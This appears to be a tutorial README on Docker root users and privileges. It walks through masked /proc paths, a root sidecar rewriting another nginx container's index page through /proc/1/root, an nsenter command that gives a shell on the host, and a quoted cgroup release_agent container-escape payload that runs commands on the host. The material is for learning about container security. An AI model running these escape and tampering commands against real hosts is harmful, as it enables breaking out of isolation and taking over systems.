# Example 5 - Root user

Demonstrate root user and privilege inside the container.  

TODO:

* try and nsenter into the host
* try and list all the host processes from inside the container.

Refer to [../13_users_and_permissions/README.md](../13_users_and_permissions/README.md) for more examples.  

## Script to follow

Demonstrate internal users and privilege  

### Build the image (root and user)

```sh
# build root
docker build --no-cache -t roottest -f root.Dockerfile .
# build myuser
docker build --no-cache -t usertest -f user.Dockerfile .
```

### Run as privileged (root)

```sh
# roottest
docker run -it --rm --privileged --entrypoint "/bin/bash" --name roottest roottest

# in container shell
whoami
cat /proc/timer_list

# from another terminal
docker inspect $(docker ps --filter name=roottest -q)

# "MaskedPaths": null,
# "ReadonlyPaths": null
```

### Run as privileged (user)

```sh
# usertest
docker run -it --rm --privileged --entrypoint "/bin/bash" --name usertest usertest

# in container shell
whoami
# even though privileged we can't 'cat timer_list'
cat /proc/timer_list

# from another terminal
docker inspect $(docker ps --filter name=usertest -q)

# "MaskedPaths": null,
# "ReadonlyPaths": null
```

### Run as non-privileged and inspect (root)

```sh
# roottest
docker run -it --rm --entrypoint "/bin/bash" --name roottest roottest

# in container shell
whoami
# does not list anything but works (masked path)
cat /proc/timer_list

# from another terminal
docker inspect $(docker ps --filter name=roottest -q)

# should see in output
"MaskedPaths": [
    "/proc/asound",
    "/proc/acpi",
    "/proc/kcore",
    "/proc/keys",
    "/proc/latency_stats",
    "/proc/timer_list",
    "/proc/timer_stats",
    "/proc/sched_debug",
    "/proc/scsi",
    "/sys/firmware"
],
"ReadonlyPaths": [
    "/proc/bus",
    "/proc/fs",
    "/proc/irq",
    "/proc/sys",
    "/proc/sysrq-trigger"
]
```

### Run as non-privileged and inspect (myuser)

```sh
# usertest
docker run -it --rm --entrypoint "/bin/bash" --name usertest usertest

# in container shell
whoami
# does not list anything but works (masked path)
cat /proc/timer_list

# from another terminal
docker inspect $(docker ps --filter name=usertest -q)

```

## Modify another container using sidecar rootuser

Start an nginx container

```sh
# start nginx
docker run --rm --name mynginx -p 8080:80 -d nginx 
open http://localhost:8080/

# open unprivileged non-root user sidecar
docker run -it --rm --pid=container:$(docker ps --filter name=mynginx -q) --entrypoint "/bin/bash" usertest
# Change the nginx static file (permission denied)
cat /proc/1/root/etc/nginx/nginx.conf

# open unprivileged root user sidecar (allows us to edit files)
docker run -it --rm --pid=container:$(docker ps --filter name=mynginx -q) --entrypoint "/bin/bash" roottest

# Change the nginx static file
cat /proc/1/root/etc/nginx/nginx.conf
cat /proc/1/root/etc/nginx/conf.d/default.conf
apt update
apt install nano
# edit the <h1>Welcome to hacked nginx!</h1>
nano /proc/1/root/usr/share/nginx/html/index.html
cat /proc/1/root/usr/share/nginx/html/index.html

open http://localhost:8080/
```

## Modify another container using privileged rootuser

```sh
# open privileged sidecar
docker run -it --rm --privileged --entrypoint "/bin/bash" roottest

# try and nsenter into the host
# try and list all the containers from inside.
```

## Get onto the docker desktop alpine host

```sh
# nsenter into the host docker alpine 
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Changing and reloading config  

```sh
# We should also be able to change config and reload 
docker exec -it $(docker ps --filter name=mynginx -q) nginx -s reload  
docker stop mynginx 
```

## Escape the container

This will only work on Linux.  It doesn't work on Docker for Desktop.

**TODO** Can I use this to get access to another container filesystem without being in same namespace?  
[understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)  
```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps -aux >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```